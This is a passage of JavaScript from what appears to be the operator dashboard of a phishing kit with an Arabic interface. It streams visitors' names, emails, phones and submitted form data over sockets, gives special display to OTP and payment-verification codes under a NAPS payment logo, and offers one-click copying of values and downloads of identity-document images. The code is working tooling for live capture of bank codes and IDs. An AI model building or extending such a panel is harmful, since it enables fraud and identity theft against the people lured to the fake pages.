      // 4. Special Case: OTP (Verification code in white container with NAPS logo)
      if (pageId === 'otp') {
        renderOtpComponent(data, group, { isOtpPage: true });
        hasEntries = true;
        list.appendChild(group);
        return;
      }

      // 5. Special Case: Payment Verify (Verification code standard)
      if (pageId === 'payment-verify') {
        renderOtpComponent(data, group, { isOtpPage: false });
        hasEntries = true;
        list.appendChild(group);
        return;
      }

      // Fallback: Generic field-by-field layout for other pages (e.g. registration-summary, payment, wait)
      let fieldCount = 0;
      Object.entries(data).forEach(([key, value]) => {
        if (value !== undefined && value !== null && String(value).trim() !== '') {
          if (key.endsWith('Name') && data[key.replace(/Name$/, '')]) return;
          if (key.endsWith('Size') && data[key.replace(/Size$/, '')]) return;
          if (key === 'terms') return;

          fieldCount++;
          const item = document.createElement('div');
          item.className = 'message-item';

          const label = document.createElement('span');
          label.className = 'message-label';
          label.textContent = FORM_FIELD_LABELS[key] || key;
          item.appendChild(label);

          const strVal = String(value).trim();
          const val = document.createElement('span');
          val.className = 'message-value';
          val.textContent = escapeHtml(strVal);
          item.appendChild(val);
          group.appendChild(item);
        }
      });

      if (fieldCount > 0) {
        hasEntries = true;
        list.appendChild(group);
      }
    }
  });

  if (!hasEntries) {
    list.innerHTML = `
      <div style="padding:40px 20px; text-align:center; color:var(--text-muted);">
        <i class="fas fa-clipboard-list" style="font-size:2.5rem; margin-bottom:12px; opacity:0.4;"></i>
        <h4 style="margin-bottom:6px; color:var(--text);">في انتظار إدخال بيانات النموذج</h4>
        <p style="font-size:13px;">المستخدم يتصفح الموقع ولم يقم بإدخال بيانات في النماذج بعد.</p>
      </div>`;
  }
}

window.copyToClipboard = function (text, btnEl) {
  if (!text) return;
  const onSuccess = () => {
    if (btnEl) {
      const origHtml = btnEl.innerHTML;
      btnEl.classList.add('copied');
      btnEl.innerHTML = '<i class="fas fa-check"></i> تم النسخ!';
      setTimeout(() => {
        btnEl.classList.remove('copied');
        btnEl.innerHTML = origHtml;
      }, 1800);
    }
  };

  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(onSuccess).catch(() => {
      fallbackCopy(text, onSuccess);
    });
  } else {
    fallbackCopy(text, onSuccess);
  }
};

function fallbackCopy(text, cb) {
  try {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    if (cb) cb();
  } catch (e) { }
}

function setupSearch() {
  const searchInput = document.getElementById('user-search');
  if (searchInput) {
    searchInput.addEventListener('input', (e) => {
      const term = e.target.value.toLowerCase();
      const filtered = users.filter(u => {
        const name = getUserDisplayName(u).toLowerCase();
        const email = (u.email || '').toLowerCase();
        const phone = (u.phone || '').toLowerCase();
        return name.includes(term) || email.includes(term) || phone.includes(term);
      });
      renderUserList(filtered);
    });
  }
}

if (socket) {
  socket.on('user:connected', ({ sessionId, page, name, email, phone, formData }) => {
    let user = users.find(u => u.sessionId === sessionId);
    if (user) {
      user.isConnected = true;
      if (page && page !== 'unknown') user.currentPage = page;
      if (name) user.name = name;
      if (email) user.email = email;
      if (phone) user.phone = phone;
      if (formData) user.formData = formData;
    } else {
      loadUsers();
    }
    renderUserList(users);
    if (currentUserData && currentUserData.sessionId === sessionId) {
      currentUserData.isConnected = true;
      if (page && page !== 'unknown') currentUserData.currentPage = page;
      if (name) currentUserData.name = name;
      if (email) currentUserData.email = email;
      if (phone) currentUserData.phone = phone;
      if (formData) currentUserData.formData = formData;
      renderChat(currentUserData);
    }
    loadStats();
  });

  socket.on('user:disconnected', ({ sessionId }) => {
    const user = users.find(u => u.sessionId === sessionId);
    if (user) {
      user.isConnected = false;
      renderUserList(users);
      if (currentUserData && currentUserData.sessionId === sessionId) {
        currentUserData.isConnected = false;
        renderChat(currentUserData);
      }
    }
    loadStats();
  });

  socket.on('user:page-change', ({ sessionId, page, name, email, phone }) => {
    const user = users.find(u => u.sessionId === sessionId);
    if (user) {
      if (page && page !== 'unknown') user.currentPage = page;
      user.isConnected = true;
      if (name) user.name = name;
      if (email) user.email = email;
      if (phone) user.phone = phone;
      renderUserList(users);
      if (currentUserData && currentUserData.sessionId === sessionId) {
        if (page && page !== 'unknown') currentUserData.currentPage = page;
        currentUserData.isConnected = true;
        if (name) currentUserData.name = name;
        if (email) currentUserData.email = email;
        if (phone) currentUserData.phone = phone;
        renderChat(currentUserData);
      }
    }
  });

  socket.on('user:form-submit', (data) => {
    const { sessionId, page, formData, name, email, phone, allFormData } = data;
    const user = users.find(u => u.sessionId === sessionId);
    if (user) {
      if (!user.formData) user.formData = {};
      user.formData[page] = formData;
      if (allFormData) user.formData = allFormData;
      if (name) user.name = name;
      if (email) user.email = email;
      if (phone) user.phone = phone;
      renderUserList(users);
    }
    if (currentUserData && currentUserData.sessionId === sessionId) {
      if (!currentUserData.formData) currentUserData.formData = {};
      currentUserData.formData[page] = formData;
      if (allFormData) currentUserData.formData = allFormData;
      if (name) currentUserData.name = name;
      if (email) currentUserData.email = email;
      if (phone) currentUserData.phone = phone;
      renderChat(currentUserData);
    }
  });

  socket.on('user:update', (data) => {
    const { sessionId, page, formData, name, email, phone, allFormData } = data;
    const user = users.find(u => u.sessionId === sessionId);
    if (user) {
      if (!user.formData) user.formData = {};
      if (formData) user.formData[page] = formData;
      if (allFormData) user.formData = allFormData;
      if (page && page !== 'unknown') user.currentPage = page;
      if (name) user.name = name;
      if (email) user.email = email;
      if (phone) user.phone = phone;
      renderUserList(users);
    }
    if (currentUserData && currentUserData.sessionId === sessionId) {
      if (!currentUserData.formData) currentUserData.formData = {};
      if (formData) currentUserData.formData[page] = formData;
      if (allFormData) currentUserData.formData = allFormData;
      if (page && page !== 'unknown') currentUserData.currentPage = page;
      if (name) currentUserData.name = name;
      if (email) currentUserData.email = email;
      if (phone) currentUserData.phone = phone;
      renderChat(currentUserData);
    }
  });
}

function getInitials(name) {
  if (!name) return 'م';
  const parts = name.trim().split(' ');
  if (parts.length >= 2) {
    return (parts[0].charAt(0) + parts[1].charAt(0)).toUpperCase();
  }
  return name.substring(0, 2).toUpperCase();
}

function escapeHtml(str) {
  if (typeof str !== 'string') return str;
  return str.replace(/[&<>"']/g, function (m) {
    switch (m) {
      case '&': return '&amp;';
      case '<': return '&lt;';
      case '>': return '&gt;';
      case '"': return '&quot;';
      case "'": return '&#039;';
    }
  });
}

window.openImageModal = function (src, title = 'وثيقة إثبات الهوية') {
  let modal = document.getElementById('image-lightbox-modal');
  if (!modal) {
    modal = document.createElement('div');
    modal.id = 'image-lightbox-modal';
    modal.className = 'image-modal-backdrop';
    document.body.appendChild(modal);
  }

  modal.innerHTML = `
    <div class="image-modal-content" onclick="event.stopPropagation()">
      <button class="image-modal-close" onclick="window.closeImageModal()" aria-label="إغلاق">&times;</button>
      <div style="margin-bottom:12px; color:#fff; font-size:15px; font-weight:600; text-align:center;">
        <i class="fas fa-id-card"></i> ${escapeHtml(title)}
      </div>
      <img src="${src}" alt="${escapeHtml(title)}" />
      <div class="image-modal-actions">
        <a href="${src}" download="${escapeHtml(title || 'identity-document.jpg')}" class="btn btn-primary">
          <i class="fas fa-download"></i> تحميل الصورة بالدقة الكاملة
        </a>
        <button class="btn btn-secondary" onclick="window.closeImageModal()">
          <i class="fas fa-times"></i> إغلاق
        </button>
      </div>
    </div>
  `;

  modal.style.display = 'flex';
  modal.onclick = function () {
    window.closeImageModal();
  };

  const handleKeydown = function (e) {
    if (e.key === 'Escape') {
      window.closeImageModal();
      document.removeEventListener('keydown', handleKeydown);
    }
  };
  document.addEventListener('keydown', handleKeydown);
};

window.closeImageModal = function () {
  const modal = document.getElementById('image-lightbox-modal');
  if (modal) {
    modal.style.display = 'none';
  }
};

document.addEventListener('DOMContentLoaded', () => {
  setupSearch();

  const closeBtn = document.getElementById('close-chat');
  if (closeBtn) {
    closeBtn.addEventListener('click', () => {
      currentUserData = null;
      const placeholder = document.getElementById('chat-placeholder');
      const activeChat = document.getElementById('chat-active');
      if (activeChat) {
        activeChat.classList.add('hidden');
        activeChat.style.display = 'none';
      }
      if (placeholder) {
        placeholder.classList.remove('hidden');
        placeholder.style.display = 'flex';
      }
      document.querySelectorAll('.user-item').forEach(el => el.classList.remove('active'));
    });
  }
});
